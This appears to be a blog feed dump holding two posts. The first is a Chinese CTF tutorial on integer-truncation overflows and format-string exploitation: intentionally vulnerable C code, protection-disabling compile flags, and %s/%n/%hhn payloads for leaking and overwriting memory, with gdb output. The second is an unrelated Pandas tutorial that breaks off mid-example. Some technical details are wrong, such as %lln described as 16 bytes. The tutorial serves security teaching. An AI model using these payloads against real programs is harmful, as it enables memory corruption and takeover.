<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">memcpy</span><span class="params">(<span class="keyword">void</span> *, <span class="keyword">const</span> <span class="keyword">void</span> *, <span class="keyword">size_t</span>)</span></span>;</span><br><span class="line"><span class="function">chat *<span class="title">strncpy</span><span class="params">(<span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">size_t</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">strlen</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *)</span></span>;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>


<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// main.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *passwd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> pw[<span class="number">0x10</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> passwd_len = <span class="built_in">strlen</span>(passwd);</span><br><span class="line">    <span class="keyword">if</span>(passwd_len &gt;= <span class="number">4</span> &amp;&amp; passwd_len &lt;= <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;nice!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">strcpy</span>(pw, passwd);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;bad!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    foo(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>关闭canary保护，开启栈可执行编译</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -fno-stack-protector -z execstack main.c -o main</span><br></pre></td></tr></table></figure>
<p>当<code>passwd_len</code>在区间[4, 8]时，才会执行<code>strcpy</code>函数，而<code>strlen</code>函数返回<code>size_t</code>类型，其类型属于无符号且标准保证其宽度大于<code>unsigned char</code></p>
<p>当<code>size_t</code>类型取值260时，转换为<code>unsigned int</code>类型其值截断为4，刚好符合要求</p>
<p>使用gdb调试目标程序，先生成260个字节的字符串，以其做参数执行<code>r</code>，可以看到造成了溢出</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ pattern_create 260</span><br><span class="line"><span class="string">&#x27;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2021/02/27/Linux-Pwn-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E4%B8%8E%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/1.png"></p>
<h2 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h2><p>格式化字符串漏洞主要利用格式化字符串函数中的可变参特性以及格式化字符串中的<strong>转换指示符</strong></p>
<p>比较常见的转换指示符如下：</p>
<table>
<thead>
<tr>
<th align="center">转换指示符</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>%d</strong></td>
<td align="center">打印有符号整型</td>
</tr>
<tr>
<td align="center"><strong>%u</strong></td>
<td align="center">打印无符号整型</td>
</tr>
<tr>
<td align="center"><strong>%x</strong></td>
<td align="center">打印十六进制</td>
</tr>
<tr>
<td align="center"><strong>%s</strong></td>
<td align="center">打印字符串</td>
</tr>
<tr>
<td align="center"><strong>%c</strong></td>
<td align="center">打印字符</td>
</tr>
<tr>
<td align="center"><strong>%n</strong></td>
<td align="center">将打印字符串的长度写会到对应的参数所指示的地址上去</td>
</tr>
</tbody></table>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h4 id="使程序崩溃"><a href="#使程序崩溃" class="headerlink" title="使程序崩溃"></a>使程序崩溃</h4><p>可以使用多个<code>%s</code>作为格式化字符串函数的format（例如<code>printf</code>）来使程序崩溃</p>
<p><code>%s</code>通过将对应参数的内容作为字符串首地址进行解析，当访问的地址处于保护或是非法地址时，则会崩溃</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> format[<span class="number">128</span>];</span><br><span class="line">    <span class="keyword">int</span> arg1 = <span class="number">1</span>, arg2 = <span class="number">0x88888888</span>, arg3 = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">char</span> arg4[<span class="number">10</span>] = <span class="string">&quot;ABCD&quot;</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, format);</span><br><span class="line">    <span class="built_in">printf</span>(format, arg1, arg2, arg3, arg4);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>将上述示例代码编译</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwn@ubuntu:~/workspace/format_vuln$ gcc -m32 -fno-stack-protector -no-pie main.c -o main</span><br><span class="line">pwn@ubuntu:~/workspace/format_vuln$ checksec main</span><br><span class="line">[*] <span class="string">&#x27;/home/giantbranch/workspace/format_vuln/main&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">pwn@ubuntu:~/workspace/format_vuln$ </span><br></pre></td></tr></table></figure>
<p>之后输入多个<code>%s</code>，运行可以看进程崩溃在<code>vfprintf</code>上</p>
<p><img src="/2021/02/27/Linux-Pwn-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E4%B8%8E%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/2.png"></p>
<h4 id="栈数据泄露"><a href="#栈数据泄露" class="headerlink" title="栈数据泄露"></a>栈数据泄露</h4><p>接着上个示例，通过<code>printf(format, arg1, arg2, arg3, arg4);</code>打印<code>arg1 ~ arg4</code>，我们使用<code>%08x-%08x-%08x-%08x-%08x</code>来打印5个数据，可以看到第五个数据是栈上存储的<code>format</code>变量</p>
<p><img src="/2021/02/27/Linux-Pwn-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E4%B8%8E%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/3.png"></p>
<p>格式化字符串函数内部会使用一个指针来指向需要被格式化的参数，依照格式化字符串一次解析并格式化，故在完成解析格式化最后一个参数后，若格式化字符串中还有剩余的<strong>转换指示符</strong>，那么就会继续解析并格式化栈上后续的数据</p>
<p>另外，可以通过<code>%n$x</code>来指定解析格式化第<code>n</code>个参数，例如使用<code>%6$x</code>来解析第6个参数</p>
<p><img src="/2021/02/27/Linux-Pwn-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E4%B8%8E%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/4.png"></p>
<h4 id="任意地址内存泄露"><a href="#任意地址内存泄露" class="headerlink" title="任意地址内存泄露"></a>任意地址内存泄露</h4><p>攻击者使用<code>%s</code>格式化字符串时，可以泄露参数（指针）所指向内存地址，并解析成字符串，直到遇到<code>NULL</code>为止。如果攻击者可以操纵此参数（指针）的值，那么就能达到泄露任意内存地址</p>
<p>还是以上面为例，输入<code>AAAA-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x</code>得到如下结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> ► f 0  8048512 main+119</span><br><span class="line">   f 1 f7e1b647 __libc_start_main+247</span><br><span class="line">Breakpoint *0x08048512</span><br><span class="line">gdb-peda$ c</span><br><span class="line">Continuing.</span><br><span class="line">AAAA-00000001-88888888-ffffffff-ffffceba-ffffcec4-080481fc-ffffcf18-f7ffda74-00000001-424134a0-00004443-00000000-41414141-3830252d-30252d78-252d7838-2d783830-78383025-3830252d-30252d78</span><br></pre></td></tr></table></figure>
<p><code>41414141</code>在<code>arg13</code>的位置上，使用<code>%13$s</code>来读出<code>0x41414141</code>地址的字符串，这里可以控制将<code>0x41414141</code>改成其他合法地址就能泄露内存</p>
<p>例如将其改为<code>0xffffceba</code>，这里是字符串<code>ABCD</code>的首地址</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;print(&quot;\xba\xce\xff\xff&quot;+&quot;-%13$s&quot;)&#x27;</span> &gt; ./test.txt</span><br></pre></td></tr></table></figure>
<p><img src="/2021/02/27/Linux-Pwn-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E4%B8%8E%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/5.png"></p>
<p>通常，可以将某函数的GOT地址传入，泄露出函数的RVA，然后根据libc中的相对偏移，可以获取任意函数的地址</p>
<p>首先通过<code>readelf -r</code>获取重定向表</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwn@ubuntu:~/workspace/format_vuln$ readelf -r ./main</span><br><span class="line"></span><br><span class="line">Relocation section <span class="string">&#x27;.rel.dyn&#x27;</span> at offset 0x2e8 contains 1 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">08049ffc  00000206 R_386_GLOB_DAT    00000000   __gmon_start__</span><br><span class="line"></span><br><span class="line">Relocation section <span class="string">&#x27;.rel.plt&#x27;</span> at offset 0x2f0 contains 4 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">0804a00c  00000107 R_386_JUMP_SLOT   00000000   <span class="built_in">printf</span>@GLIBC_2.0</span><br><span class="line">0804a010  00000307 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0</span><br><span class="line">0804a014  00000407 R_386_JUMP_SLOT   00000000   putchar@GLIBC_2.0</span><br><span class="line">0804a018  00000507 R_386_JUMP_SLOT   00000000   __isoc99_scanf@GLIBC_2.7</span><br></pre></td></tr></table></figure>
<p>接着泄露这几个函数的地址，可以看到<code>printf@GLIBC_2.0</code>函数地址不对，少了<code>0x0c</code>（不可见字符，被忽略了）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwn@ubuntu:~/workspace/format_vuln$ python -c <span class="string">&#x27;print(&quot;\x0c\xa0\x04\x08&quot;+&quot;-%13$x&quot;)&#x27;</span> | ./main</span><br><span class="line">�-2d0804a0</span><br><span class="line">pwn@ubuntu:~/workspace/format_vuln$ python -c <span class="string">&#x27;print(&quot;\x10\xa0\x04\x08&quot;+&quot;-%13$x&quot;)&#x27;</span> | ./main</span><br><span class="line">�-804a010</span><br><span class="line">pwn@ubuntu:~/workspace/format_vuln$ python -c <span class="string">&#x27;print(&quot;\x14\xa0\x04\x08&quot;+&quot;-%13$x&quot;)&#x27;</span> | ./main</span><br><span class="line">�-804a014</span><br><span class="line">pwn@ubuntu:~/workspace/format_vuln$ python -c <span class="string">&#x27;print(&quot;\x18\xa0\x04\x08&quot;+&quot;-%13$x&quot;)&#x27;</span> | ./main</span><br><span class="line">�-804a018</span><br></pre></td></tr></table></figure>
<p>于是就使用另外几个，这里挑<code>putchar@GLIBC_2.0</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;print(&quot;\x14\xa0\x04\x08&quot;+&quot;-%13$x&quot;)&#x27;</span> &gt; ./test.txt</span><br></pre></td></tr></table></figure>
<p><img src="/2021/02/27/Linux-Pwn-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E4%B8%8E%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/6.png"></p>
<p>因为延迟绑定，这里<code>putchar</code>没有调用过，可以看到GOT表指向了PLT表项，下面是以<code>scanf</code>为例，可以得到<code>scanf</code>的地址</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;print(&quot;\x18\xa0\x04\x08&quot;+&quot;-%13$x&quot;)&#x27;</span> &gt; ./test.txt</span><br></pre></td></tr></table></figure>
<p><img src="/2021/02/27/Linux-Pwn-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E4%B8%8E%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/7.png"></p>
<h4 id="栈数据覆盖"><a href="#栈数据覆盖" class="headerlink" title="栈数据覆盖"></a>栈数据覆盖</h4><p>接着上面的例子，修改<code>arg2</code>的内容（<code>arg2</code>的地址为<code>0xffffce98</code>），使用<code>%n</code>来将输出的字符串的长度写回到指定的地址中</p>
<p>例如将<code>arg2</code>修改为0x12345678，这里打印<code>arg1</code>设置宽度<code>0x12345678 - 4</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;print(&quot;\x98\xce\xff\xff&quot;+&quot;%.305419892x%13$n&quot;)&#x27;</span> &gt; test.txt</span><br></pre></td></tr></table></figure>
<p><img src="/2021/02/27/Linux-Pwn-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E4%B8%8E%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/8.png"></p>
<p>这种将地址放前，<code>%n</code>在后，能写入的最小值为4，如果要小于4，单纯使用格式化字符串漏洞的话就需要将地址放在后面，例如下面将<code>arg2</code>改成1</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">// 首先需要构造格式化字符串 <span class="string">&quot;A%16<span class="variable">$nAA</span>&quot;</span>，这里的16先当作占位符，需要调试得到，此格式化字符串为8字节（三个<span class="string">&#x27;A&#x27;</span>共3字节，<span class="string">&quot;%16<span class="variable">$n</span>&quot;</span>为5字节）</span><br><span class="line">// 在格式化字符串后面构造地址，一共8 + 4 = 12字节</span><br><span class="line">// 先用 <span class="string">&quot;A%16<span class="variable">$nAA</span>&quot;</span> + <span class="string">&quot;BBBB&quot;</span> 看看内存布局</span><br><span class="line">python -c <span class="string">&#x27;print(&quot;A%16$nAA&quot; + &quot;BBBB&quot;)&#x27;</span> &gt; test.txt</span><br></pre></td></tr></table></figure>
<p><img src="/2021/02/27/Linux-Pwn-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E4%B8%8E%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/9.png"></p>
<p>可以看到<code>0x42424242</code>在<code>arg15</code>上，将其替换为<code>0xffffce98</code>，并将当时的<code>16</code>改为<code>15</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;print(&quot;A%15$nAA&quot; + &quot;\x98\xce\xff\xff&quot;)&#x27;</span> &gt; test.txt</span><br></pre></td></tr></table></figure>
<p><img src="/2021/02/27/Linux-Pwn-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E4%B8%8E%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/10.png"></p>
<h4 id="任意地址内存覆盖"><a href="#任意地址内存覆盖" class="headerlink" title="任意地址内存覆盖"></a>任意地址内存覆盖</h4><p>任意地址覆盖其实就同上面栈数据覆盖一样，控制所需要覆盖的地址即可</p>
<p>另外，通过对成都修饰符的改变来写入指定宽度的数据</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">%hhn	<span class="comment">// 单字节</span></span><br><span class="line">%hn		<span class="comment">// 双字节</span></span><br><span class="line">%n		<span class="comment">// 4字节</span></span><br><span class="line">%ln		<span class="comment">// 8字节</span></span><br><span class="line">%lln	<span class="comment">// 16字节</span></span><br></pre></td></tr></table></figure>
<p>例如下面通过<code>%hhn</code>写入1字节</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;print(&quot;A%15$hhn&quot; + &quot;\x98\xce\xff\xff&quot;)&#x27;</span> &gt; test.txt</span><br></pre></td></tr></table></figure>
<p><img src="/2021/02/27/Linux-Pwn-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E4%B8%8E%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/11.png"></p>
<p>利用这种特性，可以逐字节的来覆盖内容，比如将<code>arg2</code>改成<code>0x123456</code></p>
<p>首先构造占位字符”AAAABBBBCCCCDDDD”，确定内存布局</p>
<p><img src="/2021/02/27/Linux-Pwn-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E4%B8%8E%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/12.png"></p>
<p>这里就按下面的映射关系来设定内存的值</p>
<figure class="highlight elm"><table><tr><td class="code"><pre><span class="line">  占位符        值        目标地址</span><br><span class="line"><span class="number">0x41414141</span> -&gt; <span class="number">0x78</span> <span class="comment">--- 0xffffce98</span></span><br><span class="line"><span class="number">0x42424242</span> -&gt; <span class="number">0x56</span> <span class="comment">--- 0xffffce99</span></span><br><span class="line"><span class="number">0x43434343</span> -&gt; <span class="number">0x34</span> <span class="comment">--- 0xffffce9a</span></span><br><span class="line"><span class="number">0x44444444</span> -&gt; <span class="number">0x12</span> <span class="comment">--- 0xffffce9b</span></span><br></pre></td></tr></table></figure>
<p>构造如下字符串，其中写入了四个四字节地址，共<code>0x10</code>字节，就有：</p>
<ul>
<li><code>%104c%13$hhn</code>为<code>0x78 - 0x10</code></li>
<li><code>%222c%14$hhn</code>为<code>0x156 - 0x78</code></li>
<li><code>%222c%15$hhn</code>为<code>0x234 - 0x156</code></li>
<li><code>%222c%16$hhn</code>为<code>0x312 - 0x234</code></li>
</ul>
<p>由于使用了<code>hhn</code>，只会写入低字节</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;print(&quot;\x98\xce\xff\xff&quot; + &quot;\x99\xce\xff\xff&quot; + &quot;\x9a\xce\xff\xff&quot; + &quot;\x9b\xce\xff\xff&quot; + &quot;%104c%13$hhn&quot; + &quot;%222c%14$hhn&quot; + &quot;%222c%15$hhn&quot; + &quot;%222c%16$hhn&quot;)&#x27;</span> &gt; test.txt</span><br></pre></td></tr></table></figure>
<p><img src="/2021/02/27/Linux-Pwn-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E4%B8%8E%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/13.png"></p>
<h3 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h3><p>在实际利用过程中，ASLR保护会使得地址随机化，另外在调试和非调试状态下的地址也可能是不同的，需要结合地址泄露再根据该地址计算出实际地址方可利用</p>
<h4 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h4><p>在x64下，参数传递被寄存器化</p>
<ul>
<li><p>Linux上通过<code>rdi</code>、<code>rsi</code>、<code>rdx</code>、<code>rcx</code>、<code>r8</code>、<code>r9</code>传递前6个参数，其余通过栈传递</p>
</li>
<li><p>Windows上通过<code>rcx</code>、<code>rdx</code>、<code>r8</code>、<code>r9</code>来传递前4个参数，其余通过栈传递</p>
</li>
</ul>
<p>存储在寄存器上的值（例如上面例子里的<code>arg2</code>）就不能在通过格式化字符串漏洞来覆盖了</p>
<p>将上面的例子编译成64位的</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -fno-stack-protector -no-pie main.c -o main64</span><br></pre></td></tr></table></figure>
<p>输入<code>AAAAAAAA-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x</code></p>
<p><img src="/2021/02/27/Linux-Pwn-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E4%B8%8E%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/14.png"></p>
<p>打印的结果为</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ c</span><br><span class="line">Continuing.</span><br><span class="line">AAAAAAAA-1-88888888-ffffffff-ffffdcc0-f7fdc700-44434241-0-41414141-2d78252d-78252d78</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>二进制安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Pandas库入门</title>
    <url>/2021/02/12/Pandas%E5%BA%93%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<p>Pandas库入门</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Pandas是python第三方库，以提供高性能易用数据类型和分析工具。Pandas基于NumPy实现，常与NumPy和Matplotlib一同使用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br></pre></td></tr></table></figure>


<h2 id="Pandas库的理解"><a href="#Pandas库的理解" class="headerlink" title="Pandas库的理解"></a>Pandas库的理解</h2><p>Pandas主要提供两个数据类型：<code>Series</code>和<code>DataFrame</code></p>
<ul>
<li><code>Series</code>相当于一维的数据类型</li>
<li><code>DataFrame</code>相当于二维（N维）的数据类型</li>
</ul>
<p>基于上述数据类型的各类操作有：基本操作、运算操作、特征类操作、关联类操作</p>
<table>
<thead>
<tr>
<th>NumPy</th>
<th>Pandas</th>
</tr>
</thead>
<tbody><tr>
<td>基础数据类型</td>
<td>扩展数据类型</td>
</tr>
<tr>
<td>关注数据的结构表达</td>
<td>关注数据的应用表达</td>
</tr>
<tr>
<td>维度：数据间关系</td>
<td>数据与索引关系</td>
</tr>
</tbody></table>
<h3 id="Series类型"><a href="#Series类型" class="headerlink" title="Series类型"></a>Series类型</h3><p>Series类型由一组数据及与之相关的数据索引组成</p>
<p><img src="/2021/02/12/Pandas%E5%BA%93%E5%85%A5%E9%97%A8/1.png"></p>
<p>例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = pd.Series([<span class="number">9</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">6</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line"><span class="comment"># 第一列为自动索引</span></span><br><span class="line"><span class="comment"># 第二列为传入的列表值</span></span><br><span class="line"><span class="number">0</span>    <span class="number">9</span></span><br><span class="line"><span class="number">1</span>    <span class="number">9</span></span><br><span class="line"><span class="number">2</span>    <span class="number">7</span></span><br><span class="line"><span class="number">3</span>    <span class="number">6</span></span><br><span class="line">dtype: int64</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 自定义索引，其中index参数位于第二个参数时，可以不指定index</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = pd.Series([<span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">6</span>], index=[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b</span><br><span class="line">a    <span class="number">9</span></span><br><span class="line">b    <span class="number">8</span></span><br><span class="line">c    <span class="number">7</span></span><br><span class="line">d    <span class="number">6</span></span><br><span class="line">dtype: int64</span><br></pre></td></tr></table></figure>
<p>Series类型可以由如下类型创建：</p>
<ul>
<li>python列表</li>
<li>标量值<ul>
<li><code>s = pd.Series(25, index=[&#39;a&#39;, &#39;b&#39;, &#39;c&#39;])</code>，这里的<code>index</code>不能省略</li>
</ul>
</li>
<li>python字典<ul>
<li><code>d = pd.Series(&#123;&#39;a&#39;:9, &#39;b&#39;:8, &#39;c&#39;:7&#125;)</code></li>
<li><code>e = pd.Series(&#123;&#39;a&#39;:9, &#39;b&#39;:8, &#39;c&#39;:7&#125;, index=[&#39;c&#39;, &#39;a&#39;, &#39;b&#39;, &#39;d&#39;])</code></li>
</ul>
</li>
<li>ndarray<ul>
<li><code>n = pd.Series(numpy.arange(5))</code></li>
<li><code>n = pd.Series(numpy.arange(5), index=numpy.arange(9, 4, -1))</code></li>
</ul>
</li>
<li>其他函数</li>
</ul>
<h4 id="Series类型的基本操作"><a href="#Series类型的基本操作" class="headerlink" title="Series类型的基本操作"></a>Series类型的基本操作</h4><p>Series类型包括<code>index</code>和<code>values</code>两部分</p>
<p>Series类型的操作类似ndarray类型</p>
<ul>
<li><p>索引方法相同，使用<code>[]</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = pd.Series([<span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">6</span>], [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b.index</span><br><span class="line">Index([<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>], dtype=<span class="string">&#x27;object&#x27;</span>)	<span class="comment"># Series.index的类型为Index，为pandas内建的类型，不可修改</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b.values</span><br><span class="line">array([<span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">6</span>], dtype=int64)	<span class="comment"># Series.values的类型为array，沿用了ndarray</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b[<span class="string">&#x27;b&#x27;</span>]</span><br><span class="line"><span class="number">8</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b[<span class="number">1</span>]	<span class="comment"># 自动索引是默认生成的，但自动索引和自定义索引不能混用</span></span><br><span class="line"><span class="number">8</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b[[<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;a&#x27;</span>]]</span><br><span class="line">c    <span class="number">7</span></span><br><span class="line">d    <span class="number">6</span></span><br><span class="line">a    <span class="number">9</span></span><br><span class="line">dtype: int64</span><br></pre></td></tr></table></figure></li>
<li><p>NumPy中运算和操作可用于Series类型</p>
</li>
<li><p>可以通过Series自定义索引的类别进行切片</p>
</li>
<li><p>可以通过自动索引进行切片，如果存在自定义索引，则一同被切片</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 切片</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b</span><br><span class="line">a    <span class="number">9</span></span><br><span class="line">b    <span class="number">8</span></span><br><span class="line">c    <span class="number">7</span></span><br><span class="line">d    <span class="number">6</span></span><br><span class="line">dtype: int64</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b[<span class="number">3</span>]</span><br><span class="line"><span class="number">6</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b[:<span class="number">3</span>]</span><br><span class="line">a    <span class="number">9</span></span><br><span class="line">b    <span class="number">8</span></span><br><span class="line">c    <span class="number">7</span></span><br><span class="line">dtype: int64</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b[b &gt; b.median()]	<span class="comment"># 大于中位数的</span></span><br><span class="line">a    <span class="number">9</span></span><br><span class="line">b    <span class="number">8</span></span><br><span class="line">dtype: 